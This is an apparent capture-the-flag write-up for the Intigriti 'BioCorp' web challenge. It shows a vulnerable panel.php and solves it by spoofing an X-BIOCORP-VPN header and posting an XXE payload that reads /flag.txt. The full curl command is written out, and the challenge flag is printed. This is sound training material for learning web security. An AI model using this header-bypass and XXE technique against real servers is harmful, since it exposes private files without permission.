# BioCorp [389 Solves]

## Description

> BioCorp contacted us with some concerns about the security of their network. Specifically, they want to make sure they've decoupled any dangerous functionality from the public facing website. Could you give it a quick review?
>
> `https://biocorp.ctf.intigriti.io`
>
> Attachments: biocorp.zip

<details><summary>Attachment file tree</summary>

```console
$ unzip -t biocorp.zip
Archive:  biocorp.zip
    testing: docker-compose.yml       OK
    testing: start.sh                 OK
    testing: web/                     OK
    testing: web/app/                 OK
    testing: web/app/contact.php      OK
    testing: web/app/services.php     OK
    testing: web/app/panel.php        OK
    testing: web/app/index.php        OK
    testing: web/app/assets/          OK
    testing: web/app/assets/js/       OK
    testing: web/app/assets/js/main.js   OK
    testing: web/app/assets/css/      OK
    testing: web/app/assets/css/style.css   OK
    testing: web/app/assets/images/   OK
    testing: web/app/assets/images/team-member2.png   OK
    testing: web/app/assets/images/hero-image.png   OK
    testing: web/app/assets/images/logo.png   OK
    testing: web/app/assets/images/team-member1.png   OK
    testing: web/app/assets/images/maintenance.png   OK
    testing: web/app/assets/images/energy-consulting.png   OK
    testing: web/app/assets/images/nuclear-energy.png   OK
    testing: web/app/assets/images/power-grid.png   OK
    testing: web/app/about.php        OK
    testing: web/app/header.php       OK
    testing: web/app/footer.php       OK
    testing: web/app/data/            OK
    testing: web/app/data/reactor_data.xml   OK
    testing: web/flag.txt             OK
    testing: web/Dockerfile           OK
No errors detected in compressed data of biocorp.zip.
```

</details>

<details><summary>panel.php</summary>

```php
<?php
$ip_address = $_SERVER['HTTP_X_BIOCORP_VPN'] ?? $_SERVER['REMOTE_ADDR'];

if ($ip_address !== '80.187.61.102') {
    echo "<h1>Access Denied</h1>";
    echo "<p>You do not have permission to access this page.</p>";
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && strpos($_SERVER['CONTENT_TYPE'], 'application/xml') !== false) {
    $xml_data = file_get_contents('php://input');
    $doc = new DOMDocument();
    if (!$doc->loadXML($xml_data, LIBXML_NOENT)) {
        echo "<h1>Invalid XML</h1>";
        exit;
    }
} else {
    $xml_data = file_get_contents('data/reactor_data.xml');
    $doc = new DOMDocument();
    $doc->loadXML($xml_data, LIBXML_NOENT);
}

$temperature = $doc->getElementsByTagName('temperature')->item(0)->nodeValue ?? 'Unknown';
$pressure = $doc->getElementsByTagName('pressure')->item(0)->nodeValue ?? 'Unknown';
$control_rods = $doc->getElementsByTagName('control_rods')->item(0)->nodeValue ?? 'Unknown';

include 'header.php';
?>

<div class="container center-content">
    <h1>Welcome to the Control Panel</h1>
    <p>Here you can view reactor values:</p>

    <ul class="reactor-values">
        <li><i class="fas fa-thermometer-half"></i> Temperature: <?php echo htmlspecialchars($temperature); ?> °C</li>
        <li><i class="fas fa-tachometer-alt"></i> Pressure: <?php echo htmlspecialchars($pressure); ?> kPa</li>
        <li><i class="fas fa-cogs"></i> Control Rods: <?php echo htmlspecialchars($control_rods); ?></li>
    </ul>

    <button id="refresh-btn">Refresh Reactor Values</button>
</div>

<script>
    document.getElementById('refresh-btn').addEventListener('click', function () {
        location.reload();
    });
</script>

<?php include 'footer.php'; ?>
```

</details>

## Flag

INTIGRITI{c4r3ful_w17h_7h053_c0n7r0l5_0r_7h3r3_w1ll_b3_4_m3l7d0wn}

## Solution

- The panel.php is vulneable
- `$_SERVER['HTTP_X_BIOCORP_VPN']` PHP variable is user-controllable by `X-BIOCORP-VPN: 80.187.61.102` HTTP header.
  - [PHP: $_SERVER - Manual](https://www.php.net/manual/en/reserved.variables.server.php)
    > In addition to the elements listed below, PHP will create additional elements with values from request headers. These entries will be named HTTP_ followed by the header name, capitalized and with underscores instead of hyphens. For example, the Accept-Language header would be available as $_SERVER['HTTP_ACCEPT_LANGUAGE'].
- XML External Entity (XXE)

```console
$ vi xxe.xml

$ cat xxe.xml
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///flag.txt'>]>
<reactor>
    <status>
        <temperature>&test;</temperature>
        <pressure>1337</pressure>
        <control_rods>Lowered</control_rods>
    </status>
</reactor>

$ curl -s -H "X-BIOCORP-VPN: 80.187.61.102" -H "Content-Type: application/xml" -d @xxe.xml https://biocorp.ctf.intigriti.io/panel.php | grep -i INTIGRITI
        <li><i class="fas fa-thermometer-half"></i> Temperature: INTIGRITI{c4r3ful_w17h_7h053_c0n7r0l5_0r_7h3r3_w1ll_b3_4_m3l7d0wn} °C</li>
```
